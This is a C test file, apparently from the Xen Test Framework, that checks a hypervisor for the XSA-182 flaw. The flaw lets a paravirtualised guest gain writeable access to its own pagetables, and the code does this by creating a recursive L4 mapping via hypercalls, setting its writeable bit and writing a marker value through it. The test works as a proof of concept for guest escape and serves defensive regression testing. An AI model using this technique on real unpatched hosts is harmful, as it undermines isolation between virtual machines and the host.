/**
 * @file tests/xsa-182/main.c
 * @ref test-xsa-182
 *
 * @page test-xsa-182 XSA-182
 *
 * Advisory: [XSA-182](http://xenbits.xen.org/xsa/advisory-182.html)
 *
 * There is a trick with pagetables, known as recursive pagetables (also
 * linear or twisted pagetables), where a top level pagetable referrers back
 * to itself.  This creates an area of virtual address space which accesses
 * the currently-active pagetables rather than the RAM mapped by them.  This
 * method is used by certain kernels as part of its memory management
 * subsystem.
 *
 * Xen has to code to cope with x86 PV guests creating such pagetables, albeit
 * it with the usual safety proviso that a PV guest must never be able to
 * write to its own pagetables.
 *
 * While the logic to create recursive pagetables does check and reject
 * writeable mappings, some of the the fastpath logic permitted changing the
 * writeable bit in isolation, allowing a guest to obtain writeable access to
 * its own pagetables.
 *
 * @see tests/xsa-182/main.c
 */
#include <xtf.h>

#include <arch/x86/pagetable.h>
#include <arch/x86/symbolic-const.h>

const char test_title[] = "XSA-182 PoC";

void test_main(void)
{
    unsigned long cr3 = read_cr3();
    intpte_t nl1e = pte_from_paddr(cr3, PF_SYM(AD, U, P));
    intpte_t *l4 = _p(KB(4));

    /* Map the L4 at 4K virtual. */
    if ( hypercall_update_va_mapping(l4, nl1e, UVMF_INVLPG) )
        return xtf_error("Error: Update va failed\n");

    unsigned long map_slot = 0, test_slot = 0;
    unsigned int i;

    /* Search for free L4 slots. */
    for ( i = 0; i < L4_PT_ENTRIES; ++i )
    {
        if ( !(l4[i] & PF_SYM(P)) )
        {
            map_slot = i;
            break;
        }
    }
    for ( ; i < L4_PT_ENTRIES; ++i )
    {
        if ( !(l4[i] & PF_SYM(P)) )
        {
            test_slot = i;
            break;
        }
    }

    if ( !map_slot || !test_slot )
        return xtf_error("Insufficient free l4 slots\n");

    mmu_update_t mu =
        {
            .ptr = cr3 + (map_slot * PTE_SIZE),
            .val = cr3 | PF_SYM(AD, U, P),
        };

    printk("  Creating recursive l4 mapping\n");
    if ( hypercall_mmu_update(&mu, 1, NULL, DOMID_SELF) )
        return xtf_error("Recursive mapping failed\n");

    printk("  Remapping l4 RW\n");
    mu.val |= _PAGE_RW;
    if ( hypercall_mmu_update(&mu, 1, NULL, DOMID_SELF) )
    {
        printk("  Attempt to create writeable linear map was blocked\n");
        return xtf_success("Not vulnerable to XSA-182\n");
    }

    /*
     * At this point, we are quite certain that Xen is vulnerable.  Poke
     * around some more for extra confirmation.
     */

    /* Construct a pointer to the writeable mapping of the live l4 table. */
    intpte_t *writeable = _p(map_slot << L4_PT_SHIFT |
                             map_slot << L3_PT_SHIFT |
                             map_slot << L2_PT_SHIFT |
                             map_slot << L1_PT_SHIFT);

    writeable[test_slot] = 0xdeadf00d;

    barrier();

    if ( l4[test_slot] == 0xdeadf00d )
    {
        printk("  Successfully constructed writeable pagetables\n");
        xtf_failure("Fail: Vulnerable to XSA-182\n");
    }

    /*
     * Clean up the damage, or Xen will have a reference counting issue when
     * freeing memory.
     */
    writeable[test_slot] = 0;
    barrier();
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
